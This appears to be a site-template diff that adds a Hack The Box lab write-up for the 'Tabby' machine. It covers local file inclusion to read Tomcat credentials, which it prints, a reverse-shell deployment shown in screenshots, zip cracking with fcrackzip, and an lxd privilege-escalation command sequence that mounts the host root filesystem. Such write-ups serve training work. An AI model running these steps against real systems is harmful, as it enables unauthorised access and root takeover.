@@ -9,7 +9,7 @@
 
     <link rel="icon" href="/images/favicon.png" type="image/png">
 
-    <title>HTB :: 7own</title>
+    <title>Tabby :: 7own</title>
 
     
     <link href="/css/nucleus.css?1604777773" rel="stylesheet">
@@ -36,7 +36,7 @@
     </style>
     
   </head>
-  <body class="" data-url="/writeup/htb/">
+  <body class="" data-url="/writeup/htb/tabby/">
     <nav id="sidebar" class="">
 
 
@@ -645,7 +645,7 @@
     
     <li data-nav-id="/writeup/htb/" title="HTB" class="dd-item 
         parent
-        active
+        
         
         ">
       <a href="/writeup/htb/">
@@ -699,8 +699,8 @@
   
     
     <li data-nav-id="/writeup/htb/tabby/" title="Tabby" class="dd-item 
-        
-        
+        parent
+        active
         
         ">
       <a href="/writeup/htb/tabby/">
@@ -863,6 +863,8 @@
                         </a>
                     </span>
                   
+                  <span id="toc-menu"><i class="fas fa-list-alt"></i></span>
+                  
                   <span class="links">
                  
                  
@@ -877,7 +879,13 @@
             
           
           
-            <a href='/'>HomePage</a> > <a href='/writeup/'>Write up</a> > HTB
+            
+            
+          
+          
+            <a href='/'>HomePage</a> > <a href='/writeup/'>Write up</a> > <a href='/writeup/htb/'>HTB</a> > Tabby
+          
+        
           
         
           
@@ -888,24 +896,131 @@
                   </span>
                 </div>
                 
+                    <div class="progress">
+    <div class="wrapper">
+<nav id="TableOfContents"></nav>
+    </div>
+</div>
+
+                
               </div>
             </div>
             
         <div id="head-tags">
         
+<div class="tags">
+
+  <a class="tag-link" href="/tags/lfi">LFI</a>
+
+  <a class="tag-link" href="/tags/tomcat">tomcat</a>
+
+  <a class="tag-link" href="/tags/lxd-privesc">lxd privesc</a>
+
+</div>
+
         </div>
         
-          <div id="chapter">
-        
         <div id="body-inner">
+          
+            <h1>
+              
+              Tabby
+            </h1>
           
 
         
 
 
 
-	<h1 id="htb-writeup">HTB Writeup</h1>
+	<p><img src="/images/htb/tabby/0.png" alt="Minion"></p>
+<p>Let&rsquo;s start with NMAP on the IP of the box 10.10.10.194 :
+<img src="/images/htb/tabby/1.png" alt="Minion"></p>
+<p>As we can see, some interesting protocols:</p>
+<pre><code>22 / SSH
+80 / HTTP
+8080 / TOMCAT
+</code></pre><p>Let&rsquo;s check the website :
+<img src="/images/htb/tabby/2.png" alt="Minion"></p>
+<p>We can observe a call to a file in the url : news.php?file=statement
+<img src="/images/htb/tabby/3.png" alt="Minion"></p>
+<p>Try LFI, jackpot
+<img src="/images/htb/tabby/4.png" alt="Minion">
+Find usernames :</p>
+<pre><code>ash
+lxd
+tomcat
+</code></pre><p>After google research, i&rsquo;ve find the path of the tomcat-users.xml file</p>
+<pre><code>/usr/share/tomcat9/etc/tomcat-users.xml
+</code></pre><p><img src="/images/htb/tabby/5.png" alt="Minion"></p>
+<p>First user :</p>
+<pre><code>tomcat:$3cureP4s5w0rd123!
+</code></pre><p>Since we have tomcat admin, we can send a payload to get a reverse shell :
+<img src="/images/htb/tabby/6.png" alt="Minion">
+<img src="/images/htb/tabby/7.png" alt="Minion"></p>
+<p>Upload this payload to Tomcat server
+<img src="/images/htb/tabby/8.png" alt="Minion"></p>
+<p>And check if the webapp is correctly installed
+<img src="/images/htb/tabby/9.png" alt="Minion"></p>
+<p>There is time to run the payload and get the reverse shell
+<img src="/images/htb/tabby/10.png" alt="Minion"></p>
+<p>After some enumeration, we can see backup archive (zip).
+We will try to download them and see if we can find something interresting
+<img src="/images/htb/tabby/12.png" alt="Minion">
+<img src="/images/htb/tabby/13.png" alt="Minion">
+<img src="/images/htb/tabby/16.png" alt="Minion"></p>
+<p>The archive is protected by a password.
+fcrackzip can help us with this</p>
+<pre><code>fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip
+</code></pre><p><img src="/images/htb/tabby/18.png" alt="Minion"></p>
+<p>I&rsquo;ve checked the backup and there is nothing.
+Try to access to ash account.
+<img src="/images/htb/tabby/19.png" alt="Minion"></p>
+<pre><code>ash:admin@it
+</code></pre><p>User pwnd, let&rsquo;s get root.
+With &ldquo;id&rdquo; we can see that ash belong to lxd group.
+A privesc is possible with it.
+<img src="/images/htb/tabby/20.png" alt="Minion"></p>
+<pre><code>SOURCES :
+https://www.hackingarticles.in/lxd-privilege-escalation/
+https://github.com/saghul/lxd-alpine-builder/blob/master/build-alpine
+</code></pre><p><img src="/images/htb/tabby/20.png" alt="Minion">
+<img src="/images/htb/tabby/21.png" alt="Minion">
+<img src="/images/htb/tabby/22.png" alt="Minion">
+<img src="/images/htb/tabby/23.png" alt="Minion"></p>
+<p>I tried to import lxc image over the reverse shell and it doesn&rsquo;t work.
+So i&rsquo;ve create and add /home/ash/.ssh/authorized_keys
+<img src="/images/htb/tabby/24.png" alt="Minion">
+<img src="/images/htb/tabby/25.png" alt="Minion"></p>
+<p>Let&rsquo;s finish the procedure :</p>
+<blockquote>
+<p>Just for be sure :
+<img src="/images/htb/tabby/26.png" alt="Minion"></p>
+</blockquote>
+<p>Listed command :</p>
+<pre><code>lxc init evil default -c security.privileged=true
+lxc config device add default mydevice disk source=/ path=/mnt/root recursive=true
+lxc start default
+lxc exec default /bin/sh
+</code></pre><p><img src="/images/htb/tabby/27.png" alt="Minion">
+<img src="/images/htb/tabby/28.png" alt="Minion"></p>
+<p>The root below is the root of the image.
+We&rsquo;ve mount the real root directory, so let&rsquo;s check if we have access to ssh key
+<img src="/images/htb/tabby/29.png" alt="Minion"></p>
+<p>Getting the root
+<img src="/images/htb/tabby/30.png" alt="Minion">
+<img src="/images/htb/tabby/31.png" alt="Minion"></p>
+<p>This is the end of this box.
+ENJOY and KEEP TRY HARDER !</p>
+<pre><code>TAGS : 
+------
+Local file inclusion, lxc and lxd privesc, crack zip, tomcat investigation 
 
+Knowledge acquiered : 
+---------------------
+Local file inclusion breachs are classics.
+LXC and LXD privilege escalation is interesting and the most important part in this box.
+First use of Tomcat, learned more about how to deploy and run a webapp.
+</code></pre>
 
 
 
@@ -914,8 +1029,6 @@
 	
 </footer>
 
-        
-            </div> 
         
         </div>
         
@@ -1301,6 +1414,7 @@
             
                 
                     
+                    
                 
                 
 
@@ -1322,6 +1436,9 @@
             
             
                 
+                    
+                        
+                        
                     
                 
                 
